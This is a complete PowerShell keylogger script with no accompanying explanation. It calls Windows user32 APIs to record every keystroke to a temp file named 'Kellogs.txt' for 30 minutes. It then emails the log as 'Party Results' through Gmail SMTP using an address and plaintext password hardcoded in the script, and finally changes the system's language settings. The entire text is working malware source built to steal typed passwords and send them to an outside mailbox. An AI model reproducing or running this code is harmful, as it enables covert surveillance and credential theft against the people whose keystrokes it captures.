$TimeForFun = 30
$Dear = "nuclearcheese4atomicrats@gmail.com"
$Pw = "Ratas123!!"
$To = "nuclearcheese4atomicrats@gmail.com"
$Subject = "Party Results"
$body = "Kellogs Results"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "465"
$credentials = new-object Management.Automation.PSCredential $Dear, ($Pw | ConvertTo-SecureString -AsPlainText -Force)
############################
 
 
$TimeStart = Get-Date
$TimeEnd = $timeStart.addminutes($TimeForFun)
 
function Start-Kellogs($Path="$env:temp\Kellogs.txt")
{
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
 
  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force
 
  try
  {
 
 
    while ($TimeEnd -ge $TimeNow) {
      Start-Sleep -Milliseconds 40
 
 
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)
 
 
        if ($state -eq -32767) {
          $null = [console]::CapsLock
 
 
          $virtualKey = $API::MapVirtualKey($ascii, 3)
 
 
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
 
 
          $mychar = New-Object -TypeName System.Text.StringBuilder
 
 
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
          if ($success)
          {
 
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
          }
        }
      }
      $TimeNow = Get-Date
    }
  }
  finally
  {
    send-mailmessage -from $Dear -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
    exit 1
  }
}
 
 
Start-Kellogs
Set-WinUserLanguageList -Force es-ES,el-GR,en-US
